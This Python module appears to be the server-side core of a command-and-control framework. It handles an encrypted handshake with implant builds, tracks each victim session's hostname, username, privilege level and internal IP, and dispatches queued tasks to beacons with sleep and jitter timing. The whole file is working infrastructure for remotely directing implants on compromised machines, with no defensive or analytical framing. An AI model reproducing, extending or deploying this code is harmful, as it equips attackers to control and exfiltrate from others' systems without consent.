"""Session registry and the transport-independent beacon core.

Both the HTTPS listener and the raw TCP listener call into BeaconCore, so the
handshake, frame handling, task claiming, and result storage logic exists once.
"""

from __future__ import annotations

import os
import threading
import time
from dataclasses import dataclass, field
from typing import Any

from . import protocol
from .crypto import (
    CryptoError,
    FrameCipher,
    SessionKeys,
    b64d,
    b64e,
    derive_keys,
    new_keypair,
    verify_registration,
)
from .store import Store, claim_tasks, now, store_result, upsert_session


class SessionNotFound(Exception):
    pass


@dataclass
class LiveSession:
    id: str
    keys: SessionKeys
    inbound: FrameCipher
    outbound: FrameCipher
    transport: str
    peer_ip: str
    last_seen: float = field(default_factory=time.time)
    transport_handle: Any = None

    def touch(self) -> None:
        self.last_seen = time.time()


class SessionRegistry:
    """Holds live AEAD state. Crypto state is deliberately in-memory only."""

    def __init__(self, store: Store, reg_key: bytes) -> None:
        self.store = store
        self.reg_key = reg_key
        self._lock = threading.RLock()
        self._sessions: dict[str, LiveSession] = {}

    # -- handshake --------------------------------------------------------
    def handshake(
        self,
        public_b64: str,
        nonce_b64: str,
        proof: str,
        meta: protocol.SessionMeta,
        external_ip: str,
        transport: str,
        build_id: str,
        capabilities: int,
    ) -> dict[str, Any]:
        try:
            peer_pub = b64d(public_b64)
            nonce = b64d(nonce_b64)
        except CryptoError:
            raise ValueError("malformed handshake material")
        if len(nonce) < 16:
            raise ValueError("nonce too short")

        # each build carries its own registration key, so a single leaked
        # artifact can be revoked without invalidating the rest of the fleet
        reg_key = self.reg_key
        if build_id:
            row = self.store.one(
                "SELECT reg_key FROM builds WHERE id = %s", (build_id,)
            )
            if row and row.get("reg_key"):
                reg_key = bytes.fromhex(row["reg_key"])
            elif not self.reg_key:
                raise PermissionError("unknown build id")
        if not verify_registration(reg_key, peer_pub, nonce, proof):
            raise PermissionError("registration proof rejected")

        server = new_keypair()
        salt = os.urandom(16)
        # initiator's view -> server takes the mirror
        initiator = derive_keys(server.private, peer_pub, salt)
        keys = initiator.mirrored()

        session_id = upsert_session(
            self.store,
            meta,
            external_ip=external_ip,
            build_id=build_id,
            capabilities=capabilities,
        )

        live = LiveSession(
            id=session_id,
            keys=keys,
            inbound=FrameCipher(keys.recv_key),
            outbound=FrameCipher(keys.send_key),
            transport=transport,
            peer_ip=external_ip,
            last_seen=time.time(),
        )
        with self._lock:
            self._sessions[session_id] = live

        self.store.log_event(
            "session", f"{meta.username}@{meta.hostname} checked in via {transport}",
            session_id,
        )
        return {
            "v": protocol.PROTO,
            "sid": session_id,
            "pk": server.public_b64,
            "salt": b64e(salt),
            "sleep": 60,
            "jitter": 20,
        }

    # -- beacon -----------------------------------------------------------
    def get(self, session_id: str) -> LiveSession:
        with self._lock:
            live = self._sessions.get(session_id)
        if live is None:
            raise SessionNotFound(session_id)
        return live

    def drop(self, session_id: str) -> None:
        with self._lock:
            self._sessions.pop(session_id, None)
        self.store.execute(
            "UPDATE sessions SET alive = 0 WHERE id = %s", (session_id,)
        )

    def beacon(
        self, session_id: str, frame: bytes, external_ip: str | None = None
    ) -> bytes:
        live = self.get(session_id)
        live.touch()
        plaintext = live.inbound.open(frame)
        request = protocol.BeaconRequest.from_wire(protocol.loads(plaintext))

        for result in request.results:
            store_result(
                self.store,
                session_id,
                result.id,
                result.ok,
                result.data,
                result.err,
            )

        claimed = claim_tasks(self.store, session_id, request.want or 1)
        if request.meta:
            meta = protocol.SessionMeta.from_wire(request.meta)
            self.store.execute(
                "UPDATE sessions SET hostname = %s, username = %s, os_name = %s, "
                "arch = %s, pid = %s, internal_ip = %s, elevated = %s, "
                "last_seen = %s, alive = 1 WHERE id = %s",
                (
                    meta.hostname,
                    meta.username,
                    meta.os_name,
                    meta.arch,
                    meta.pid,
                    meta.internal_ip,
                    1 if meta.elevated else 0,
                    now(),
                    session_id,
                ),
            )
        else:
            self.store.execute(
                "UPDATE sessions SET last_seen = %s, alive = 1 WHERE id = %s",
                (now(), session_id),
            )

        response = protocol.BeaconResponse(
            tasks=[protocol.Task(**t) for t in claimed],
            sleep=60,
            jitter=20,
            kill=False,
        )
        return live.outbound.seal(protocol.dumps(response.to_wire()))

    # -- housekeeping -----------------------------------------------------
    def live_ids(self) -> list[str]:
        with self._lock:
            return list(self._sessions.keys())

    def reap(self, idle_after: float = 900.0) -> int:
        cutoff = time.time() - idle_after
        stale: list[str] = []
        with self._lock:
            for sid, live in self._sessions.items():
                if live.last_seen < cutoff:
                    stale.append(sid)
        for sid in stale:
            self.drop(sid)
        return len(stale)
